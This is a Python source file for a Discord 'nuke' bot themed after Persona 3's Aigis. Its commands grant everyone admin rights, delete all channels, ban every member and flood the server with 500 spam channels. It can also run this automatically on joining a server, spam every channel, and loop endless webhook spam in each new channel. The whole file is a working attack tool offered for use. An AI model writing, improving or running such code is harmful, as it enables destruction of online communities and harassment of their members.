import discord, random, aiohttp, asyncio
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
import os

client = commands.Bot(command_prefix = '?')
spam_messages = ["orgia mode"]
channel_names = ["persona"]
webhook_usernames = ["makoto", "aigis 2", "aigis 1"]
nuke_on_join = False
nuke_wait_time = 0

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="Persona 3 FES"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id)

@client.command()
async def aigis(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "Aigis - Commands", 
    description = """
**__COMMANDS__**
```
{prefix}aigis
Shows this message. 
 
{prefix}orgia
Nukes the server. 
 
{prefix}sall <message>
Spams all the channels.
 
{prefix}ccr <channel count> <channel name>
Creates channels with the given name.
 
{prefix}rank
Deletes all channels.
 
{prefix}overheat
Logs out the client.
```
**__CREDITS__**
```
asdf
```
""")
  await author.send(embed = cmds)
  
  
async def nuke(guild):
  print(f"{C.WHITE}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for member in guild.members:
    try:
      await member.ban()
      print(f"{C.GREEN}Successfully banned {C.WHITE}{member.name}")
    except:
      print(f"{C.WHITE}{member.name} {C.RED}has NOT been banned.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{C.GREEN}Nuked {guild.name}.")
  
@client.command()
async def orgia(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)
  
@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return
  
@client.command()
async def sall(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass

@client.command()
async def ccr(ctx, amount = 10, *, name = None):
  if name == None:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
        return
      except:
        pass
  else:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
        return
      except:
        pass

@client.command()
async def rank(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")

@client.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "nuked")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))

@client.command()
async def overheat(ctx):
  await ctx.message.delete()
  exit()  
  
  
  
  
  
  
  
  
  
client.run(os.environ['token'])
